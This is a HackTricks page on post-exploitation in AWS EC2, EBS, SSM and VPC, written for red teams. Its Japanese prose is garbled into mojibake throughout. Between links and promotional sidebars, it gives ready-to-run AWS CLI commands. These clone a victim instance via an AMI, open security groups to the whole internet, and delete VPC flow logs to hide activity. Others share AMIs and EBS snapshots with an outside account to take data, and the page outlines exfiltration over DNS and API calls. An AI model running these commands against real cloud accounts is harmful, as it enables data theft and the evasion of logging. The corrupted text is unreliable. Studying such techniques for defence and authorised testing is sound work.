# AWS - EC2, EBS, SSM & VPC ãƒã‚¹ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ã§</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§ã®AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼ã®PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã™ã‚‹ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹**ã€ã¾ãŸã¯**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>

## EC2 & VPC

è©³ç´°ã¯ä»¥ä¸‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„:

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### **æ‚ªæ„ã®ã‚ã‚‹VPCãƒŸãƒ©ãƒ¼**

VPCãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ãƒŸãƒ©ãƒ¼ãƒªãƒ³ã‚°ã¯ã€VPCå†…ã®EC2ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®**å—ä¿¡ãŠã‚ˆã³é€ä¿¡ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’è¤‡è£½ã—ã¾ã™**ã€‚ã“ã‚Œã¯ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹è‡ªä½“ã«ä½•ã‚‚ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã›ã‚“ã€‚ã“ã®è¤‡è£½ã•ã‚ŒãŸãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã¯é€šå¸¸ã€åˆ†æã¨ãƒ¢ãƒ‹ã‚¿ãƒªãƒ³ã‚°ã®ãŸã‚ã«ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¾µå…¥æ¤œçŸ¥ã‚·ã‚¹ãƒ†ãƒ ï¼ˆIDSï¼‰ãªã©ã«é€ã‚‰ã‚Œã¾ã™ã€‚
æ”»æ’ƒè€…ã¯ã“ã‚Œã‚’æ‚ªç”¨ã—ã¦ã€ã™ã¹ã¦ã®ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã—ã€ãã“ã‹ã‚‰æ©Ÿå¯†æƒ…å ±ã‚’å–å¾—ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™:

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-malicious-vpc-mirror.md" %}
[aws-malicious-vpc-mirror.md](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-malicious-vpc-mirror.md)
{% endcontent-ref %}

### å®Ÿè¡Œä¸­ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ã‚³ãƒ”ãƒ¼

ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«ã¯é€šå¸¸ã€ä½•ã‚‰ã‹ã®æ©Ÿå¯†æƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚å†…éƒ¨ã«å…¥ã‚‹æ–¹æ³•ã¯ã„ãã¤ã‹ã‚ã‚Šã¾ã™ï¼ˆ[EC2æ¨©é™æ˜‡æ ¼ã®ã‚³ãƒ„](../../../aws-security/aws-privilege-escalation/aws-ec2-privesc.md)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼‰ã€‚ã—ã‹ã—ã€ãã®å†…å®¹ã‚’ç¢ºèªã™ã‚‹åˆ¥ã®æ–¹æ³•ã¯ã€**AMIã‚’ä½œæˆã—ã€ãã‚Œã‹ã‚‰æ–°ã—ã„ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’èµ·å‹•ã™ã‚‹ã“ã¨ã§ã™ï¼ˆè‡ªåˆ†ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã§ã•ãˆã‚‚ï¼‰**ï¼š
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆãƒ€ãƒ³ãƒ—

**ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã¯ãƒœãƒªãƒ¥ãƒ¼ãƒ ã®ãƒãƒƒã‚¯ã‚¢ãƒƒãƒ—**ã§ã‚ã‚Šã€é€šå¸¸**æ©Ÿå¯†æƒ…å ±**ã‚’å«ã‚“ã§ã„ã‚‹ãŸã‚ã€ã“ã‚Œã‚‰ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹ã“ã¨ã§æƒ…å ±ãŒæ¼æ´©ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚\
ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆãŒãªã„**ãƒœãƒªãƒ¥ãƒ¼ãƒ ã‚’è¦‹ã¤ã‘ãŸå ´åˆ**ã€ä»¥ä¸‹ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«**ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã‚’ä½œæˆã™ã‚‹**ã‹ã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆå†…ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«**ãƒã‚¦ãƒ³ãƒˆã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™ï¼š

{% content-ref url="../../../aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump.md" %}
[aws-ebs-snapshot-dump.md](../../../aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump.md)
{% endcontent-ref %}

### ãƒ‡ãƒ¼ã‚¿æµå‡º

#### DNS ã‚’ä»‹ã—ãŸæµå‡º

EC2 ãŒå¤–éƒ¨ã¨ã®é€šä¿¡ã‚’å®Œå…¨ã«é®æ–­ã—ã¦ã„ã¦ã‚‚ã€DNS ã‚’ä»‹ã—ã¦**ãƒ‡ãƒ¼ã‚¿ã‚’æµå‡º**ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

* **VPC ãƒ•ãƒ­ãƒ¼ãƒ­ã‚°ã¯ã“ã‚Œã‚’è¨˜éŒ²ã—ã¾ã›ã‚“**ã€‚
* AWS ã® DNS ãƒ­ã‚°ã«ã¯ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã›ã‚“ã€‚
*   ä»¥ä¸‹ã®è¨­å®šã§ã“ã‚Œã‚’ç„¡åŠ¹ã«ã—ã¾ã™ï¼š"enableDnsSupport" ã‚’ false ã«è¨­å®šï¼š

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### API ã‚³ãƒ¼ãƒ«ã‚’ä»‹ã—ãŸæµå‡º

æ”»æ’ƒè€…ã¯è‡ªåˆ†ãŒç®¡ç†ã™ã‚‹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã® API ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã¾ã™ã€‚Cloudtrail ã¯ã“ã‚Œã‚‰ã®å‘¼ã³å‡ºã—ã‚’è¨˜éŒ²ã—ã€æ”»æ’ƒè€…ã¯ Cloudtrail ã®ãƒ­ã‚°ã§æµå‡ºã—ãŸãƒ‡ãƒ¼ã‚¿ã‚’ç¢ºèªã§ãã¾ã™ã€‚

### ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚°ãƒ«ãƒ¼ãƒ—ã®é–‹æ”¾

ã“ã®ã‚ˆã†ã«ãƒãƒ¼ãƒˆã‚’é–‹æ”¾ã™ã‚‹ã“ã¨ã§ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ¼ãƒ“ã‚¹ã¸ã®ã•ã‚‰ãªã‚‹ã‚¢ã‚¯ã‚»ã‚¹ã‚’å¾—ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% code overflow="wrap" %}
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
{% endcode %}

### SSM ãƒã‚¹ãƒˆã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-ssm-post-exploitation.md" %}
[aws-ssm-post-exploitation.md](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-ssm-post-exploitation.md)
{% endcontent-ref %}

### ECS ã¸ã®æ¨©é™æ˜‡æ ¼

EC2 ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’å®Ÿè¡Œã—ã€ECS ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ç™»éŒ²ã—ã€ãã®å¾Œ ECS ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ãƒ‡ãƒ¼ã‚¿ã‚’ç›—ã‚€ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

[**è©³ç´°ã¯ã“ã¡ã‚‰ã‚’ã”è¦§ãã ã•ã„**](../../../aws-security/aws-privilege-escalation/aws-ec2-privesc.md#privesc-to-ecs)ã€‚

### VPC ãƒ•ãƒ­ãƒ¼ãƒ­ã‚°ã®å‰Šé™¤
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### AMIã‚’å…±æœ‰ã™ã‚‹

{% code overflow="wrap" %}
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã®å…±æœ‰

{% code overflow="wrap" %}
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ã‚’ãƒã‚§ãƒƒã‚¯ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹**ã€ã¾ãŸã¯**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã™ã‚‹**ã€‚

</details>
